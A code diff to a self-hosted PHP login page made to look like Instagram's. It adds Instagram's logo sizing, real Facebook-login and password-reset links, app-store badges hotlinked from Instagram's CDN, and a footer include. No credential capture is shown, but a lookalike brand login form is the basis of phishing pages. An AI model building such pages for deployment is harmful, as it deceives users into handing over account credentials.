@@ -60,7 +60,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <div class="login-box">
 
       <div class="card">
-        <img src="assets/logo.svg" alt="Instagram" class="logo" width="175">
+        <img src="assets/logo.svg" alt="Instagram" class="logo" width="51" height="51">
 
         <?php if ($error): ?>
           <p style="color:#ed4956; font-size:13px; text-align:center; margin:0 0 10px;">
@@ -83,20 +83,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         <div class="divider">OR</div>
 
-        <a href="#" class="fb-login">
+        <a href="https://www.facebook.com/login.php" target="_blank" rel="noopener noreferrer" class="fb-login">
           <svg viewBox="0 0 24 24" fill="#385185"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.2.2v2.5h-1.3c-1.2 0-1.6.8-1.6 1.6V12h2.8l-.4 2.9h-2.4v7A10 10 0 0 0 22 12z"/></svg>
           Log in with Facebook
         </a>
 
-        <a href="#" class="forgot">Forgot password?</a>
+        <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" rel="noopener noreferrer" class="forgot">Forgot password?</a>
       </div>
 
       <div class="signup-card">
         Don't have an account? <a href="register.php">Sign up</a>
       </div>
 
+      <div class="get-app">
+        <p>Get the app.</p>
+        <div class="store-badges">
+          <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank" rel="noopener noreferrer">
+            <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5RitZLuQQH.png" alt="Download on the App Store" height="40">
+          </a>
+          <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener noreferrer">
+            <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" height="40">
+          </a>
+        </div>
+      </div>
+
     </div>
   </div>
+
+  <?php require __DIR__ . '/includes/footer.php'; ?>
 
 </body>
 </html>
